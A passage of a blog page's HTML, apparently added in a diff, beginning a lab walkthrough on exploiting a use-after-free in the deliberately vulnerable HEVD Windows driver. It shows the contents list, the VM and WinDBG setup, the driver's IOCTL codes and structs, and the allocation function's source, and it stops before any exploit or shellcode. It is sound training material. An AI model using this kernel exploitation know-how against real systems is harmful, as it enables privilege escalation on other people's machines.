+        <a class="ltr:hx-pl-4 rtl:hx-pr-4 hx-inline-block hx-text-gray-500 hover:hx-text-gray-900 dark:hx-text-gray-400 dark:hover:hx-text-gray-300 contrast-more:hx-text-gray-900 contrast-more:hx-underline contrast-more:dark:hx-text-gray-50 hx-w-full hx-break-words" href="#functions-review">Functions review
+        </a>
+      </li>
+      <li class="hx-my-2 hx-scroll-my-6 hx-scroll-py-6">
+        <a class="ltr:hx-pl-8 rtl:hx-pr-8 hx-inline-block hx-text-gray-500 hover:hx-text-gray-900 dark:hx-text-gray-400 dark:hover:hx-text-gray-300 contrast-more:hx-text-gray-900 contrast-more:hx-underline contrast-more:dark:hx-text-gray-50 hx-w-full hx-break-words" href="#allocateuaf-function">AllocateUaF Function
+        </a>
+      </li>
+      <li class="hx-my-2 hx-scroll-my-6 hx-scroll-py-6">
+        <a class="ltr:hx-pl-8 rtl:hx-pr-8 hx-inline-block hx-text-gray-500 hover:hx-text-gray-900 dark:hx-text-gray-400 dark:hover:hx-text-gray-300 contrast-more:hx-text-gray-900 contrast-more:hx-underline contrast-more:dark:hx-text-gray-50 hx-w-full hx-break-words" href="#useuaf-function">UseUaF Function
+        </a>
+      </li>
+      <li class="hx-my-2 hx-scroll-my-6 hx-scroll-py-6">
+        <a class="ltr:hx-pl-8 rtl:hx-pr-8 hx-inline-block hx-text-gray-500 hover:hx-text-gray-900 dark:hx-text-gray-400 dark:hover:hx-text-gray-300 contrast-more:hx-text-gray-900 contrast-more:hx-underline contrast-more:dark:hx-text-gray-50 hx-w-full hx-break-words" href="#freeuaf-function">FreeUaF Function
+        </a>
+      </li>
+      <li class="hx-my-2 hx-scroll-my-6 hx-scroll-py-6">
+        <a class="ltr:hx-pl-12 rtl:hx-pr-12 hx-inline-block hx-text-gray-500 hover:hx-text-gray-900 dark:hx-text-gray-400 dark:hover:hx-text-gray-300 contrast-more:hx-text-gray-900 contrast-more:hx-underline contrast-more:dark:hx-text-gray-50 hx-w-full hx-break-words" href="#smep-brief-explanation">SMEP (brief explanation)
+        </a>
+      </li>
+      <li class="hx-my-2 hx-scroll-my-6 hx-scroll-py-6">
+        <a class="ltr:hx-pl-8 rtl:hx-pr-8 hx-inline-block hx-text-gray-500 hover:hx-text-gray-900 dark:hx-text-gray-400 dark:hover:hx-text-gray-300 contrast-more:hx-text-gray-900 contrast-more:hx-underline contrast-more:dark:hx-text-gray-50 hx-w-full hx-break-words" href="#allocatefake-function">AllocateFake Function
+        </a>
+      </li>
+      <li class="hx-my-2 hx-scroll-my-6 hx-scroll-py-6">
+        <a class="hx-font-semibold hx-inline-block hx-text-gray-500 hover:hx-text-gray-900 dark:hx-text-gray-400 dark:hover:hx-text-gray-300 contrast-more:hx-text-gray-900 contrast-more:hx-underline contrast-more:dark:hx-text-gray-50 hx-w-full hx-break-words" href="#initial-analysis">Initial Analysis
+        </a>
+      </li>
+      <li class="hx-my-2 hx-scroll-my-6 hx-scroll-py-6">
+        <a class="ltr:hx-pl-4 rtl:hx-pr-4 hx-inline-block hx-text-gray-500 hover:hx-text-gray-900 dark:hx-text-gray-400 dark:hover:hx-text-gray-300 contrast-more:hx-text-gray-900 contrast-more:hx-underline contrast-more:dark:hx-text-gray-50 hx-w-full hx-break-words" href="#how-exallocatepool-works">How ExAllocatePool works
+        </a>
+      </li>
+      <li class="hx-my-2 hx-scroll-my-6 hx-scroll-py-6">
+        <a class="ltr:hx-pl-4 rtl:hx-pr-4 hx-inline-block hx-text-gray-500 hover:hx-text-gray-900 dark:hx-text-gray-400 dark:hover:hx-text-gray-300 contrast-more:hx-text-gray-900 contrast-more:hx-underline contrast-more:dark:hx-text-gray-50 hx-w-full hx-break-words" href="#poolmoonx">PoolMoonX
+        </a>
+      </li>
+      <li class="hx-my-2 hx-scroll-my-6 hx-scroll-py-6">
+        <a class="hx-font-semibold hx-inline-block hx-text-gray-500 hover:hx-text-gray-900 dark:hx-text-gray-400 dark:hover:hx-text-gray-300 contrast-more:hx-text-gray-900 contrast-more:hx-underline contrast-more:dark:hx-text-gray-50 hx-w-full hx-break-words" href="#flow-hijacking">Flow Hijacking
+        </a>
+      </li>
+      <li class="hx-my-2 hx-scroll-my-6 hx-scroll-py-6">
+        <a class="ltr:hx-pl-4 rtl:hx-pr-4 hx-inline-block hx-text-gray-500 hover:hx-text-gray-900 dark:hx-text-gray-400 dark:hover:hx-text-gray-300 contrast-more:hx-text-gray-900 contrast-more:hx-underline contrast-more:dark:hx-text-gray-50 hx-w-full hx-break-words" href="#finding-gadget">Finding gadget
+        </a>
+      </li>
+      <li class="hx-my-2 hx-scroll-my-6 hx-scroll-py-6">
+        <a class="ltr:hx-pl-8 rtl:hx-pr-8 hx-inline-block hx-text-gray-500 hover:hx-text-gray-900 dark:hx-text-gray-400 dark:hover:hx-text-gray-300 contrast-more:hx-text-gray-900 contrast-more:hx-underline contrast-more:dark:hx-text-gray-50 hx-w-full hx-break-words" href="#register-schema">Register schema
+        </a>
+      </li>
+      <li class="hx-my-2 hx-scroll-my-6 hx-scroll-py-6">
+        <a class="ltr:hx-pl-8 rtl:hx-pr-8 hx-inline-block hx-text-gray-500 hover:hx-text-gray-900 dark:hx-text-gray-400 dark:hover:hx-text-gray-300 contrast-more:hx-text-gray-900 contrast-more:hx-underline contrast-more:dark:hx-text-gray-50 hx-w-full hx-break-words" href="#ropperpy">ropper.py
+        </a>
+      </li>
+      <li class="hx-my-2 hx-scroll-my-6 hx-scroll-py-6">
+        <a class="ltr:hx-pl-4 rtl:hx-pr-4 hx-inline-block hx-text-gray-500 hover:hx-text-gray-900 dark:hx-text-gray-400 dark:hover:hx-text-gray-300 contrast-more:hx-text-gray-900 contrast-more:hx-underline contrast-more:dark:hx-text-gray-50 hx-w-full hx-break-words" href="#applying-gadget">Applying gadget
+        </a>
+      </li>
+      <li class="hx-my-2 hx-scroll-my-6 hx-scroll-py-6">
+        <a class="ltr:hx-pl-8 rtl:hx-pr-8 hx-inline-block hx-text-gray-500 hover:hx-text-gray-900 dark:hx-text-gray-400 dark:hover:hx-text-gray-300 contrast-more:hx-text-gray-900 contrast-more:hx-underline contrast-more:dark:hx-text-gray-50 hx-w-full hx-break-words" href="#bypassing-kasrl">Bypassing KASRL
+        </a>
+      </li>
+      <li class="hx-my-2 hx-scroll-my-6 hx-scroll-py-6">
+        <a class="ltr:hx-pl-4 rtl:hx-pr-4 hx-inline-block hx-text-gray-500 hover:hx-text-gray-900 dark:hx-text-gray-400 dark:hover:hx-text-gray-300 contrast-more:hx-text-gray-900 contrast-more:hx-underline contrast-more:dark:hx-text-gray-50 hx-w-full hx-break-words" href="#executing-1st-shellcode">Executing 1st shellcode
+        </a>
+      </li>
+      <li class="hx-my-2 hx-scroll-my-6 hx-scroll-py-6">
+        <a class="ltr:hx-pl-8 rtl:hx-pr-8 hx-inline-block hx-text-gray-500 hover:hx-text-gray-900 dark:hx-text-gray-400 dark:hover:hx-text-gray-300 contrast-more:hx-text-gray-900 contrast-more:hx-underline contrast-more:dark:hx-text-gray-50 hx-w-full hx-break-words" href="#stack-canary--gs-cookie">Stack Canary / GS Cookie
+        </a>
+      </li>
+      <li class="hx-my-2 hx-scroll-my-6 hx-scroll-py-6">
+        <a class="hx-font-semibold hx-inline-block hx-text-gray-500 hover:hx-text-gray-900 dark:hx-text-gray-400 dark:hover:hx-text-gray-300 contrast-more:hx-text-gray-900 contrast-more:hx-underline contrast-more:dark:hx-text-gray-50 hx-w-full hx-break-words" href="#conclusion">Conclusion
+        </a>
+      </li></ul>
+      <div class="hx-mt-8 hx-border-t hx-bg-white hx-pt-8 hx-shadow-[0_-12px_16px_white] dark:hx-bg-dark dark:hx-shadow-[0_-12px_16px_#111] hx-sticky hx-bottom-0 hx-flex hx-flex-col hx-items-start hx-gap-2 hx-pb-8 dark:hx-border-neutral-800 contrast-more:hx-border-t contrast-more:hx-border-neutral-400 contrast-more:hx-shadow-none contrast-more:dark:hx-border-neutral-400">
+        <button aria-hidden="true" id="backToTop" onClick="scrollUp();" class="hx-transition-all hx-duration-75 hx-opacity-0 hx-text-xs hx-font-medium hx-text-gray-500 hover:hx-text-gray-900 dark:hx-text-gray-400 dark:hover:hx-text-gray-100 contrast-more:hx-text-gray-800 contrast-more:dark:hx-text-gray-50">
+          <span>Scroll to top</span>
+          <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="hx-inline ltr:hx-ml-1 rtl:hx-mr-1 hx-h-3.5 hx-w-3.5 hx-border hx-rounded-full hx-border-gray-500 hover:hx-border-gray-900 dark:hx-border-gray-400 dark:hover:hx-border-gray-100 contrast-more:hx-border-gray-800 contrast-more:dark:hx-border-gray-50">
+            <path stroke-linecap="round" stroke-linejoin="round" d="M4.5 15.75l7.5-7.5 7.5 7.5" />
+          </svg>
+        </button>
+      </div>
+    </div>
+  </nav>
+
+
+    <article class="hx-w-full hx-break-words hx-flex hx-min-h-[calc(100vh-var(--navbar-height))] hx-min-w-0 hx-justify-center hx-pb-8 hx-pr-[calc(env(safe-area-inset-right)-1.5rem)]">
+      <main class="hx-w-full hx-min-w-0 hx-max-w-6xl hx-px-6 hx-pt-4 md:hx-px-12">
+        
+  <div class="hx-mt-1.5 hx-flex hx-items-center hx-gap-1 hx-overflow-hidden hx-text-sm hx-text-gray-500 dark:hx-text-gray-400 contrast-more:hx-text-current">
+        <div class="hx-whitespace-nowrap hx-transition-colors hx-min-w-[24px] hx-overflow-hidden hx-text-ellipsis hover:hx-text-gray-900 dark:hover:hx-text-gray-100">
+          <a href="/winint-compilation/">WinInt Compilation</a>
+        </div><svg class="hx-w-3.5 hx-shrink-0 rtl:-hx-rotate-180" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" aria-hidden="true"><path stroke-linecap="round" stroke-linejoin="round" d="M9 5l7 7-7 7"/></svg><div class="hx-whitespace-nowrap hx-transition-colors hx-font-medium hx-text-gray-700 contrast-more:hx-font-bold contrast-more:hx-text-current dark:hx-text-gray-100 contrast-more:dark:hx-text-current">Use-After-Free - HEVD (&#43; SMEP/KASLR/GS Cookie)</div>
+  </div>
+
+        <h1 class="hx-mt-2 hx-text-4xl hx-font-bold hx-tracking-tight hx-text-slate-900 dark:hx-text-slate-100">Use-After-Free - HEVD (&#43; SMEP/KASLR/GS Cookie)</h1>
+        <div class="hx-mt-4 hx-mb-16 hx-text-gray-500 hx-text-sm hx-flex hx-items-center hx-flex-wrap hx-gap-y-2"></div>
+        <div class="content">
+          <h2>Introduction<span class="hx-absolute -hx-mt-20" id="introduction"></span>
+    <a href="#introduction" class="subheading-anchor" aria-label="Permalink for this section"></a></h2><p>In this post we are going to deep in the attack: Use-After-Free (UAF) in a common windos vulnerable driver (HEVD). We will cover up some useful techniques of code review, debuggin and bypassing 4 used protections: <strong>Stack Canary</strong> or GS Cookie, Supervisor Mode Execution Prevention (<strong>SMEP</strong>), Kernel Address Space Layout Randomization (<strong>KASLR</strong>). We will try to analyze each protective measure in detail without making it tedious.</p>
+<h3>Environment<span class="hx-absolute -hx-mt-20" id="environment"></span>
+    <a href="#environment" class="subheading-anchor" aria-label="Permalink for this section"></a></h3><p>To make this explotation we will have two virtual machines; the victim, which contains the HEVD, is a Windows 1809 with an OS Build of 17763.1075, is useful to know the exact version to be able to calculate correctly structure offsets in vergilius and, in this case, know that the <em>SMAP</em> is disabled by default.</p>
+<ul>
+<li><a href="https://www.vergiliusproject.com/kernels/x64/windows-10/1809/" target="_blank" rel="noopener">https://www.vergiliusproject.com/kernels/x64/windows-10/1809/</a></li>
+</ul>
+<p>On the other hand, we are going to have a WinDBG connected to the victim machine to debug and analyze all the payloads. The setup of these two machines will not be explained here, as there are many resources available online, including on this website.</p>
+<h2>Source Analysis<span class="hx-absolute -hx-mt-20" id="source-analysis"></span>
+    <a href="#source-analysis" class="subheading-anchor" aria-label="Permalink for this section"></a></h2><p>As in other many walkthroughts, the code review will be with the source code from github:</p>
+<p><a href="https://github.com/hacksysteam/HackSysExtremeVulnerableDriver/tree/master/Driver/HEVD/Windows" target="_blank" rel="noopener">https://github.com/hacksysteam/HackSysExtremeVulnerableDriver/tree/master/Driver/HEVD/Windows</a></p>
+<p>But you can also choose to open your trusted decompiler and reverse-engineer the driver, in this case, we will be focusing in the following 4 functions:</p>
+<div class="hextra-code-block hx-relative hx-mt-6 first:hx-mt-0 hx-group/code">
+
+<div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#define HEVD_IOCTL_ALLOCATE_UAF_OBJECT_NON_PAGED_POOL   IOCTL(0x804)
+</span></span></span><span class="line"><span class="cl"><span class="cp">#define HEVD_IOCTL_USE_UAF_OBJECT_NON_PAGED_POOL        IOCTL(0x805)
+</span></span></span><span class="line"><span class="cl"><span class="cp">#define HEVD_IOCTL_FREE_UAF_OBJECT_NON_PAGED_POOL       IOCTL(0x806)
+</span></span></span><span class="line"><span class="cl"><span class="cp">#define HEVD_IOCTL_ALLOCATE_FAKE_OBJECT_NON_PAGED_POOL  IOCTL(0x807)</span></span></span></code></pre></div></div><div class="hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0">
+  <button
+    class="hextra-code-copy-btn hx-group/copybtn hx-transition-all active:hx-opacity-50 hx-bg-primary-700/5 hx-border hx-border-black/5 hx-text-gray-600 hover:hx-text-gray-900 hx-rounded-md hx-p-1.5 dark:hx-bg-primary-300/10 dark:hx-border-white/10 dark:hx-text-gray-400 dark:hover:hx-text-gray-50"
+    title="Copy code"
+  >
+    <div class="copy-icon group-[.copied]/copybtn:hx-hidden hx-pointer-events-none hx-h-4 hx-w-4"></div>
+    <div class="success-icon hx-hidden group-[.copied]/copybtn:hx-block hx-pointer-events-none hx-h-4 hx-w-4"></div>
+  </button>
+</div>
+</div>
+<p>Being <code>IOCTL</code>: <code>CTL_CODE(FILE_DEVICE_UNKNOWN, Function, METHOD_NEITHER, FILE_ANY_ACCESS)</code></p>
+<h3>Struct review<span class="hx-absolute -hx-mt-20" id="struct-review"></span>
+    <a href="#struct-review" class="subheading-anchor" aria-label="Permalink for this section"></a></h3><p>Each functions, as the name suggests allocates, execute and frees an object, and allocates a fake object, but&hellip; what object? If we go to <a href="https://github.com/hacksysteam/HackSysExtremeVulnerableDriver/blob/master/Driver/HEVD/Windows/UseAfterFreeNonPagedPool.h#L63" target="_blank" rel="noopener"><code>UseAfterFreeNonPagedPool.h</code></a>, the driver contains the structure:</p>
+<div class="hextra-code-block hx-relative hx-mt-6 first:hx-mt-0 hx-group/code">
+
+<div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="k">typedef</span> <span class="k">struct</span> <span class="n">_USE_AFTER_FREE_NON_PAGED_POOL</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">FunctionPointer</span> <span class="n">Callback</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">CHAR</span> <span class="n">Buffer</span><span class="p">[</span><span class="mh">0x54</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span> <span class="n">USE_AFTER_FREE_NON_PAGED_POOL</span><span class="p">,</span> <span class="o">*</span><span class="n">PUSE_AFTER_FREE_NON_PAGED_POOL</span><span class="p">;</span></span></span></code></pre></div></div><div class="hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0">
+  <button
+    class="hextra-code-copy-btn hx-group/copybtn hx-transition-all active:hx-opacity-50 hx-bg-primary-700/5 hx-border hx-border-black/5 hx-text-gray-600 hover:hx-text-gray-900 hx-rounded-md hx-p-1.5 dark:hx-bg-primary-300/10 dark:hx-border-white/10 dark:hx-text-gray-400 dark:hover:hx-text-gray-50"
+    title="Copy code"
+  >
+    <div class="copy-icon group-[.copied]/copybtn:hx-hidden hx-pointer-events-none hx-h-4 hx-w-4"></div>
+    <div class="success-icon hx-hidden group-[.copied]/copybtn:hx-block hx-pointer-events-none hx-h-4 hx-w-4"></div>
+  </button>
+</div>
+</div>
+<p>Also, <a href="https://github.com/hacksysteam/HackSysExtremeVulnerableDriver/blob/master/Driver/HEVD/Windows/UseAfterFreeNonPagedPool.h#L69" target="_blank" rel="noopener">6 lines further</a> we can see the <em>Fake Object</em> used in the <strong>IOCTL 0x807</strong></p>
+<div class="hextra-code-block hx-relative hx-mt-6 first:hx-mt-0 hx-group/code">
+
+<div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="k">typedef</span> <span class="k">struct</span> <span class="n">_FAKE_OBJECT_NON_PAGED_POOL</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">CHAR</span> <span class="n">Buffer</span><span class="p">[</span><span class="mh">0x54</span> <span class="o">+</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">PVOID</span><span class="p">)];</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span> <span class="n">FAKE_OBJECT_NON_PAGED_POOL</span><span class="p">,</span> <span class="o">*</span><span class="n">PFAKE_OBJECT_NON_PAGED_POOL</span><span class="p">;</span></span></span></code></pre></div></div><div class="hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0">
+  <button
+    class="hextra-code-copy-btn hx-group/copybtn hx-transition-all active:hx-opacity-50 hx-bg-primary-700/5 hx-border hx-border-black/5 hx-text-gray-600 hover:hx-text-gray-900 hx-rounded-md hx-p-1.5 dark:hx-bg-primary-300/10 dark:hx-border-white/10 dark:hx-text-gray-400 dark:hover:hx-text-gray-50"
+    title="Copy code"
+  >
+    <div class="copy-icon group-[.copied]/copybtn:hx-hidden hx-pointer-events-none hx-h-4 hx-w-4"></div>
+    <div class="success-icon hx-hidden group-[.copied]/copybtn:hx-block hx-pointer-events-none hx-h-4 hx-w-4"></div>
+  </button>
+</div>
+</div>
+<p>Anyways, I want to comment that in the following explotation, we are going to redefine <code>_FAKE_OBJECT_NON_PAGED_POOL</code> to a real object:</p>
+<div class="hextra-code-block hx-relative hx-mt-6 first:hx-mt-0 hx-group/code">
+
+<div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="k">typedef</span> <span class="k">struct</span> <span class="n">_FAKE_OBJECT_NON_PAGED_POOL</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">FunctionPointer</span> <span class="n">Callback</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">CHAR</span> <span class="n">Buffer</span><span class="p">[</span><span class="mh">0x54</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span> <span class="n">FAKE_OBJECT_NON_PAGED_POOL</span><span class="p">,</span> <span class="o">*</span><span class="n">PFAKE_OBJECT_NON_PAGED_POOL</span><span class="p">;</span></span></span></code></pre></div></div><div class="hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0">
+  <button
+    class="hextra-code-copy-btn hx-group/copybtn hx-transition-all active:hx-opacity-50 hx-bg-primary-700/5 hx-border hx-border-black/5 hx-text-gray-600 hover:hx-text-gray-900 hx-rounded-md hx-p-1.5 dark:hx-bg-primary-300/10 dark:hx-border-white/10 dark:hx-text-gray-400 dark:hover:hx-text-gray-50"
+    title="Copy code"
+  >
+    <div class="copy-icon group-[.copied]/copybtn:hx-hidden hx-pointer-events-none hx-h-4 hx-w-4"></div>
+    <div class="success-icon hx-hidden group-[.copied]/copybtn:hx-block hx-pointer-events-none hx-h-4 hx-w-4"></div>
+  </button>
+</div>
+</div>
+<h3>Functions review<span class="hx-absolute -hx-mt-20" id="functions-review"></span>
+    <a href="#functions-review" class="subheading-anchor" aria-label="Permalink for this section"></a></h3><p>Inside <a href="https://github.com/hacksysteam/HackSysExtremeVulnerableDriver/blob/master/Driver/HEVD/Windows/UseAfterFreeNonPagedPool.c" target="_blank" rel="noopener">UseAfterFreeNonPagedPool.c</a>, we can take a closer look at how it works, specifically how it allocate the object and execute it.</p>
+<div class="hx-overflow-x-auto hx-mt-6 hx-flex hx-flex-col hx-rounded-lg hx-border hx-py-4 hx-px-4 contrast-more:hx-border-current contrast-more:dark:hx-border-current hx-border-blue-200 hx-bg-blue-100 hx-text-blue-900 dark:hx-border-blue-200/30 dark:hx-bg-blue-900/30 dark:hx-text-blue-200">
+  <p class="hx-flex hx-items-center hx-font-medium"><svg height=16px class="hx-inline-block hx-align-middle hx-mr-2" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" aria-hidden="true"><path stroke-linecap="round" stroke-linejoin="round" d="M13 16h-1v-4h-1m1-4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z"/></svg>Note</p>
+
+  <div class="hx-w-full hx-min-w-0 hx-leading-7">
+    <div class="hx-mt-6 hx-leading-7 first:hx-mt-0"><p>In my opinion, the driver code seems a bit confusing, so I&rsquo;m going to rewrite it to make it easier to read. So all SEH (Structured Exception Handling) will be removed, but they are there to avoid BSODs.</p></div>
+  </div>
+</div>
+<h4>AllocateUaF Function<span class="hx-absolute -hx-mt-20" id="allocateuaf-function"></span>
+    <a href="#allocateuaf-function" class="subheading-anchor" aria-label="Permalink for this section"></a></h4><p>In short, the function reserves a pool with a buffer filled with A&rsquo;s (<a href="https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-rtlfillmemory" target="_blank" rel="noopener"><code>RtlFillMemory</code></a>), and the callback receives the memory address of the buffer.</p>
+<p>Then we store this newly allocated object in a global variable named: <code>g_UseAfterFreeObjectNonPagedPool</code></p>
+<div class="hextra-code-block hx-relative hx-mt-6 first:hx-mt-0 hx-group/code">
+
+<div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">NTSTATUS</span> <span class="nf">AllocateUaFObjectNonPagedPool</span><span class="p">(</span><span class="n">VOID</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">NTSTATUS</span> <span class="n">Status</span> <span class="o">=</span> <span class="n">STATUS_SUCCESS</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">PUSE_AFTER_FREE_NON_PAGED_POOL</span> <span class="n">UseAfterFree</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nf">PAGED_CODE</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">DbgPrint</span><span class="p">(</span><span class="s">&#34;[+] Allocating UaF Object</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">UseAfterFree</span> <span class="o">=</span> <span class="p">(</span><span class="n">PUSE_AFTER_FREE_NON_PAGED_POOL</span><span class="p">)</span><span class="nf">ExAllocatePoolWithTag</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">        <span class="n">NonPagedPool</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="k">sizeof</span><span class="p">(</span><span class="n">USE_AFTER_FREE_NON_PAGED_POOL</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">        <span class="p">(</span><span class="n">ULONG</span><span class="p">)</span><span class="n">POOL_TAG</span>
+</span></span><span class="line"><span class="cl">    <span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">UseAfterFree</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">DbgPrint</span><span class="p">(</span><span class="s">&#34;[-] Unable to allocate Pool chunk</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">Status</span> <span class="o">=</span> <span class="n">STATUS_NO_MEMORY</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">Status</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">else</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">DbgPrint</span><span class="p">(</span><span class="s">&#34;[+] Pool Tag: %s</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="nf">STRINGIFY</span><span class="p">(</span><span class="n">POOL_TAG</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">DbgPrint</span><span class="p">(</span><span class="s">&#34;[+] Pool Type: %s</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="nf">STRINGIFY</span><span class="p">(</span><span class="n">NonPagedPool</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">DbgPrint</span><span class="p">(</span><span class="s">&#34;[+] Pool Size: 0x%zX</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">USE_AFTER_FREE_NON_PAGED_POOL</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">DbgPrint</span><span class="p">(</span><span class="s">&#34;[+] Pool Chunk: 0x%p</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">UseAfterFree</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nf">RtlFillMemory</span><span class="p">((</span><span class="n">PVOID</span><span class="p">)</span><span class="n">UseAfterFree</span><span class="o">-&gt;</span><span class="n">Buffer</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">UseAfterFree</span><span class="o">-&gt;</span><span class="n">Buffer</span><span class="p">),</span> <span class="mh">0x41</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">UseAfterFree</span><span class="o">-&gt;</span><span class="n">Buffer</span><span class="p">[</span><span class="k">sizeof</span><span class="p">(</span><span class="n">UseAfterFree</span><span class="o">-&gt;</span><span class="n">Buffer</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="sc">&#39;\0&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">UseAfterFree</span><span class="o">-&gt;</span><span class="n">Callback</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">UaFObjectCallbackNonPagedPool</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">g_UseAfterFreeObjectNonPagedPool</span> <span class="o">=</span> <span class="n">UseAfterFree</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nf">DbgPrint</span><span class="p">(</span><span class="s">&#34;[+] UseAfterFree Object: 0x%p</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">UseAfterFree</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">DbgPrint</span><span class="p">(</span><span class="s">&#34;[+] g_UseAfterFreeObjectNonPagedPool: 0x%p</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">g_UseAfterFreeObjectNonPagedPool</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">DbgPrint</span><span class="p">(</span><span class="s">&#34;[+] UseAfterFree-&gt;Callback: 0x%p</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">UseAfterFree</span><span class="o">-&gt;</span><span class="n">Callback</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">Status</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div></div><div class="hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0">
+  <button
+    class="hextra-code-copy-btn hx-group/copybtn hx-transition-all active:hx-opacity-50 hx-bg-primary-700/5 hx-border hx-border-black/5 hx-text-gray-600 hover:hx-text-gray-900 hx-rounded-md hx-p-1.5 dark:hx-bg-primary-300/10 dark:hx-border-white/10 dark:hx-text-gray-400 dark:hover:hx-text-gray-50"
+    title="Copy code"
+  >
+    <div class="copy-icon group-[.copied]/copybtn:hx-hidden hx-pointer-events-none hx-h-4 hx-w-4"></div>
+    <div class="success-icon hx-hidden group-[.copied]/copybtn:hx-block hx-pointer-events-none hx-h-4 hx-w-4"></div>
+  </button>
+</div>
+</div>
+<p>So, if the callback stores the function address of the buffer, it will be called, no?</p>
+<h4>UseUaF Function<span class="hx-absolute -hx-mt-20" id="useuaf-function"></span>
